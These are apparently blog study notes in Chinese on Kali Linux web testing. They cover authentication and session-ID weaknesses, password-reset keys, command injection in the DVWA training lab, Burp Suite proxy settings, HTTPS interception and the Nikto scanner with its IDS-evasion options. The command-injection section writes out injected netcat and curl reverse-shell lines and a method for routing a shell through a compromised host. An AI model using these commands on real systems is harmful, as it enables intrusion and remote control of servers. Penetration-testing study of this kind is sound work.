Kali Linux笔记(四十五)：手动漏洞挖掘--身份认证、SessionID、密码找回、命令执行

发表于 2020-01-08 | 分类于 Kali

1. 手动漏洞挖掘–身份认证

  • 常用弱口令/基于字典的密码爆破
  • 锁定账号（密码锁定机制，尝试密码次数过多）
  • 信息收集
    • 手机号（大部分手机号/邮箱号）
    • 页面返回errorcode（界面不显示errorcode）
    • 密码错误提示信息（猜测四位手机号，185xxxx4465）
⭐密码错误提示信息
1.登录失败（安全性较高）
2.用户名不存在
3.密码错误
  • 密码嗅探

2. 手动漏洞挖掘–会话sessionID

  • XSS/Cookie importer
  • SessionID in URL（SessionID可以存在机器本地，也可存放在内存）
  • 嗅探
  • SessionID长期不变/永久不变
▲ SessionID注入浏览器：
1.获取其他机子的SessionID
2.通过Cookie Manager过滤，编辑SessionID
3.1.登出进行测试，后退是否能返回（SessionID可能不是活动状态，但可能永久不变）
3.2.关闭浏览器，重新访问，替换SessionID，可能可以进行访问，SessionID固定不变
  • SessionID生成算法
    • Sequencer
    • 私有算法
    • 预判下一次登陆时生成的SessionID（可能根据时间进行哈希计算作为SessionID）
    • 登出后返回测试

3. 手动漏洞挖掘–密码找回

  • https://www.example.com/reset?email=user@example.com&key=b4c9a289323b21a01c3e940f150eb9b8c542587f1abfd8f0e1cc1ffc5e475514
密码找回步骤：
1.界面点击忘记密码按钮
2.根据提示输入原密码邮箱等信息，点击发送邮件按钮
3.服务器发送邮件到客户端邮箱
4.打开邮件，邮件里面的链接可以进行密码重设（key值）
▲ 链接的key值字符串，可能为邮箱账号进行md5运算(128位)或是sha-1(160位)或是sha-2(256位)

4. 手动漏洞挖掘–命令执行

  • 漏洞挖掘原则
    • 所有变量（攻击注入手段）
    • 所有头（Cookie中的变量）
    • 逐个变量删除（Cookie还是body中的字段让服务器进行判断）
DVWA命令执行漏洞/exec:header和body进行删除，需要对一些符号进行URL encode
  • 漏洞的本质
    • 数据与指令的混淆
    • 对用户输入信息过滤不严判断失误，误将指令当数据
⭐low：DVWA命令执行漏洞/exec
1.如果是操作系统命令操作，而不是Web Application进行操作，可以进行命令行尝试
2.查看Command Execution Source，发现没有对'&&'和';'进行过滤
⭐medium：DVWA命令执行漏洞/exec
1.查看Command Execution Source，发现没有对'&&'和';'进行过滤
2.操作系统shell命令的熟悉程度，没有对'&'和'|'进行过滤
⭐high：DVWA命令执行漏洞/exec
1.查看Command Execution Source，发现过滤很严格，先对字符串进行处理ip地址，然后对输入的内容进行'.'分割的成4段，然后再判断这4段是不是都是数字，如果是，则进行运行命令
  • 命令执行
    • 应用程序开发者直接调用操作系统功能
    • ; && | || &
    • 查看源代码，过滤用户输入
    • ;mkfifo /tmp/pipe;sh /tmp/pipe | nc -nlp 4444 > /tmp/pipe
  • ;curl http://1.1.1.1/php-revers-shell.php
⭐curl下载执行php，反弹shell
Kali
1.cp /usr/share/webshells/php/php-reverse-shell.php /var/www/htmp/1.php
2.启动apache2，services apache2 start
3.编辑php-revers-shell.php的反弹IP地址 → Kali地址
DVWA：
1.;curl http://Kali IP地址/1.php
▲ 结果返回的是Kali的shell，因为1.php在Kali上，所以只能返回Kali本机的shel

⭐curl应用（控制肉鸡隐蔽性）
1.三台机器，一台Kali，开启1234端口；一台服务器DVWA；一台肉鸡，有反弹shell的php
2.kali发送;curl命令给DVWA，DVWA进行curl
3.肉鸡上的反弹php返回一个shell给kali

2. Burpsuite Proxy

  • Options
    • Proxy Listeners（默认监听8080）
⭐Banding 监听的端口，可以修改IP作为代理转发   
⭐Request handing 转发到其他主机，非真正目的地址（Redirect to host/port） 
▲ Invisible proxy 对于客户端程序不支持代理但走HTTPS协议代理功能的程序。
1.其原理是欺骗本机的DNS服务器，将所要发送的域名解析成Burpsuite的IP地址，然后通过Burpsuit本机的DNS服务器或者局域网内的解析成对公网的IP地址
2.但若本机和Burpsuit在同一台机器上，会陷入欺骗，解析本地地址的死循环
3.需要通过Options → Hostname Resolution去增加解析地址
▲ Invisible Proxy主机头问题 
1.When using plain HTTP,a proxy-style request looks like this:
GET http://example.org/foo.php HTTP/1.1
Host:example.org
2.Whereas the corresponding non-proxy-style request looks like this:
GET:/foo.php HTTP/1.1
Host:example.org
不支持代理的Web Application可能多为第二种情况的请求，不包含完整头部的HTTP头部请求，此时可开启环回网卡的Invisible Proxy功能，然后通过Redirect to host/port重定向到需要访问真正的目标地址
▲ Invisible Proxy多目标域名问题
可以创建多个环回网卡Lookback，监听多个端口，每个环回网卡都开启Invisible Proxy，然后通过Redirect to host/port重定向到需要访问真正的目标地址
⭐CA certificate（导入导出）
1.Export → certificate in DER format
2.在Proxy情况下，访问http://burp，生成CA certificate
  • Options
    • Intercept Client Request（默认截断）
▲ 默认情况下只有一条规则：File extension
▲ 请求头发生变化：Automatically uodate Content-Length header when the request is edited
  • Options
    • Intercept Server Responses（默认不截断）
默认情况下只有一条规则：Content type header
  • Options
    • Intercept WeSockets Messages
    • Response Modification
▲ 常用的Modification
Unhide hidden from fields（显示隐藏表单）
Enable disabled form fields（激活被禁止的表单）
Remove input field length limits（去除输入限制长度）
Remove JavaScript from validation（去除JavaScript的验证）
Remove All JavaScript（去除所有的JavaScript）

  • Options
    • Match and Replace（匹配和替换，Request header match就repalce）
▲ 提交数据的自动修改
Original reequest 原始的请求
Auto-modified request 修改后的请求
  • Options
    • SSL Pass Through（加密流量直接通过，不截获代理）

    • https只能提高传输层安全（只在传输过程中起到加密作用）（https劫持，中间人劫持路由器）
https过程：
1.服务器下发证书给客户端
2.客户端验证服务器的证书
3.客户端用服务器证书的公钥加密随机生成对称密钥发给服务器
4.服务器用私钥解密客户端发过来的数据，拿到对称密钥
5.进行通信，加密数据都用对称密钥
https流量劫持（在Network中间）：
1.黑客根据服务器端（名称，邮箱地址）生成一张伪造的证书（伪证书跟服务器端很像）
2.作为中间人（拥有真证书的公钥，拥有假证书的私钥）
  • 无状态
    • 每一次客户端和服务器端的通信都是独立的过程
    • WEB应用需要跟踪客户端会话（多步通信）
    • 不使用cookie的应用，客户端每次请求都要重新身份验证（不现实）
    • Session用于用户身份验证后跟踪用户行为轨迹（提高用户体验，但增加了攻击向量）
Cookie实现:
1.客户端登陆服务器端进行身份认证
2.服务器端下发Cookie给客户端
3.客户端把Cookie放在http头部发给服务器端
4.服务器端可以定时更新会话的Cookie，保证安全
▲ Cookie严格上来说等同于Session ID

4. HTTP协议基础

  • Cycle（header+body）
    • 请求/响应
  • 重要的header
    • Set-Cookie：服务器发给客户端的SessionID（被窃取的风险）
    • Content-Length：响应body部分的字节长度（基于web服务器的暴力破解，模糊测试）
    • Location：重定向用户到另一个页面，可识别身份认证后允许访问的页面
    • Cookie：客户端发回给服务器证明用户状态的信息（头：值成对出现）
    • Referrer：发起新请求之前用户位于哪个界面，服务器基于此头的安全限制很容易被修改绕过（很弱的访问控制，客户端可以修改Referrer来绕过）
暴力破解Web页面账号密码：密码错误和密码正确的Content-Length长度可能不同，可基于Content-Length判断是否密码破解成功

Kali Linux笔记(三十七)：Nikto

发表于 2019-12-27 | 分类于 Kali

1. NIKTO

  • Perl语言开发的开源web安全扫描器
  • 扫描软件版本
  • 扫描搜索存在安全隐患的文件（压缩包留下的未压缩文件）
  • 扫描服务器配置漏洞（默认配置文件存在的漏洞）
  • WEB Application层面的安全隐患
  • 避免404误判
    • 很多服务器不遵守RFC标准，对于不存在的对象返回200响应码
    • 依据响应文件内容判断，不同扩展名的文件404响应内容不同
    • 去除时间信息后的内容取MD5值哈希摘要（对于404响应内容）
    • -no404（每次扫描前不会尝试扩展名的判断，考虑性能可使用）
改进后的NIKTO：在扫描之前，会从软件数据库中，提取各自扩展名组成随机页面请求，判断是否存在，然后根据不存在的页面去除时间信息后的静态内容取MD5哈希摘要，作为扫描结果404的比对，来进行一定程度的规避404的误判，提高扫描准确性

2. NIKTO

  • 🔺命令：nikto -list -plugins（插件列表）
  • 🔺命令：nikto -update（官方网站对插件的更新，可能需要代理）▲ 2019.12.23 需要通过pull directly from git
    • cirt.net
    • http://cirt.net/nikto/UPDATES
    • Plugins：shellshock（破壳漏洞注意）
  • 🔺命令：nikto -host http://1.1.1.1 -output
  • 🔺命令：nikto -host 192.168.1.1 -ssl -port 443,8443,995
  • 🔺命令：nikto -host host.txt（一行表示一个要扫描的主机）
  • 🔺命令：nmap -p80 192.168.1.0/24 -oG（grep输出）-（输出结果）| nikto -host - ▲ 2019.12.23 语句通过管道连接报错，单独语句可以执行
  • 🔺命令：nikto -host 192.168.1.1 -userproxy http://localhost:22716（本机代理）
  • -vhost（虚拟主机，一个IP多个主机，通过主机头判断，扫描需要域名，不可IP地址）

3. NIKTO–interactive（扫描过程的交互，停止可以再次按命令）

  • Space–report current scan status（报告当前扫描状态）
  • v–verbose mode on/off（显示详细信息）
  • d–debug mode on/off（最详细信息，调试信息，发送的http请求）
  • e–error reporting on/off（错误报告显示）
  • p–progress reporting on/off（进程信息显示）
  • r–redirect display on/off（重定向显示）
  • c–cookie display on/off（服务器所给的cookie显示）
  • a–auth display on/off（身份认证过程显示）
  • q–quit（退出扫描）
  • N–next host（下一个主机）
  • P–Pauser（暂停扫描）
NIKTO不支持表单账号密码身份认证，只支持https身份认证（id+，id:pass:realm），但可以通过设置指定Cookie进行扫描Web Applicattion，需要设置配置文件

4. NIKTO 配置

  • 默认配置文件（/etc/nikto.conf）
  • 需要注意的参数
    • USERAGENT（客户端代理，默认设置Nikto/@VERSION）
    • RFIURL（远程文件包含默认文件，可自己修建自己的URL）
    • CIRT（默认更新的IP地址）
    • PROXYHOST/PROXYPORT/PROXYUSER/PROXYPASS（代理，可以修改代理）
    • STATIC-COOKIE=”cookie1”=”cookie value”;”cookie2”=”cooke val”（设置cookie）
  • -evasion：使用LibWhisker对IDS的躲避技术，可使用以下几种类型（可指定多种）：
    • Random URL encoding(non-UTF8)–随机URL编码（非UTF-8方式 ）

    • Premature URL ending– 过早结束的URL
    • Prepend long random string–优先考虑长随机字符串
    • Fake parameter–参数欺骗
    • TAB as request space–使用TAB作为命令的分隔符
    • Change the case of the URL–使用变化的URL
    • Use Windows directory separator()–使用Windows路径分隔符”"
